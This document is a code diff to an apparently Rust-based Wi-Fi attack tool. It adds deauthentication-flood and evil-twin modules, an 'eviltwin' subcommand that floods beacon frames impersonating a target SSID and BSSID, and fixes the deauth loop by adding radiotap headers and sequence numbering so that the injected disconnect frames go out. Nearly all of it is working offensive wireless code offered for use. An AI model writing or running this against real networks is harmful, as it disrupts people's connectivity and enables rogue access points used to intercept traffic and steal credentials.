@@ -29,6 +29,11 @@ mod pbkdf2_sha1;
 mod offensive;
 pub mod oui_lookup;
 pub mod raw_injector;
+pub mod deauth_ultra;
+pub mod deauth_massive;
+pub mod eviltwin_v1;
+pub mod eviltwin_v2;
+pub mod eviltwin_v3;
 
 use clap::{Parser, Subcommand};
 use std::ffi::CString;
@@ -492,6 +497,21 @@ enum Commands {
         #[arg(short = 'n', long = "count", default_value_t = 14)]
         channel_count: u8,
     },
+
+    /// Evil twin AP beacon flood
+    #[command(name = "eviltwin")]
+    Eviltwin {
+        #[arg(short = 'i', long = "interface", required = true)]
+        interface: String,
+        #[arg(short = 's', long = "ssid", required = true)]
+        ssid: String,
+        #[arg(short = 'b', long = "bssid")]
+        bssid: Option<String>,
+        #[arg(short = 'c', long = "channel", default_value_t = 6)]
+        channel: u8,
+        #[arg(short = 'n', long = "sum", default_value_t = 1)]
+        sum: u32,
+    },
 }
 
 fn inject_frames(iface: &str, frames: &[Vec<u8>], label: &str) {
@@ -881,17 +901,28 @@ async fn main() {
             match raw_injector::RawSocket::open(interface) {
                 Ok(sock) => {
                     let targeted = station_mac != "FF:FF:FF:FF:FF:FF";
+                    let radiotap: Vec<u8> = vec![0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                     let mut seq = 0u16;
                     let mut sent = 0u64;
                     while running.load(Ordering::SeqCst) {
                         for _ in 0..50 {
                             if !running.load(Ordering::SeqCst) { break; }
-                            if let Some(frame) = capture_engine::build_deauth_frame(bssid, station_mac, 7) {
+                            if let Some(mut mgmt) = capture_engine::build_deauth_frame(bssid, station_mac, 7) {
+                                mgmt[22] = (seq << 4) as u8;
+                                mgmt[23] = ((seq << 4) >> 8) as u8;
+                                seq = (seq + 1) & 0xFFF;
+                                let mut frame = radiotap.clone();
+                                frame.extend_from_slice(&mgmt);
                                 let _ = sock.send(&frame);
                                 sent += 1;
                             }
                             if targeted {
-                                if let Some(frame) = capture_engine::build_deauth_frame(station_mac, bssid, 7) {
+                                if let Some(mut mgmt) = capture_engine::build_deauth_frame(station_mac, bssid, 7) {
+                                    mgmt[22] = (seq << 4) as u8;
+                                    mgmt[23] = ((seq << 4) >> 8) as u8;
+                                    seq = (seq + 1) & 0xFFF;
+                                    let mut frame = radiotap.clone();
+                                    frame.extend_from_slice(&mgmt);
                                     let _ = sock.send(&frame);
                                     sent += 1;
                                 }
@@ -1095,6 +1126,15 @@ async fn main() {
                 Err(e) => err!("Failed to open {}: {}", interface, e),
             }
             info_log!("Airodump stopped.");
+        }
+        Commands::Eviltwin { interface, ssid, bssid, channel, sum } => {
+            let bssid_str = bssid.clone().unwrap_or_else(generate_random_mac);
+            section!("Evil twin: {} AP(s) on {} (SSID={} BSSID={} CH={})", sum, interface, ssid, bssid_str, channel);
+            let mut frames = Vec::with_capacity(*sum as usize);
+            for _ in 0..*sum {
+                frames.push(capture_engine::build_beacon_frame(ssid, &bssid_str, *channel));
+            }
+            inject_frames(interface, &frames, "EVILTWIN");
         }
     }
 }
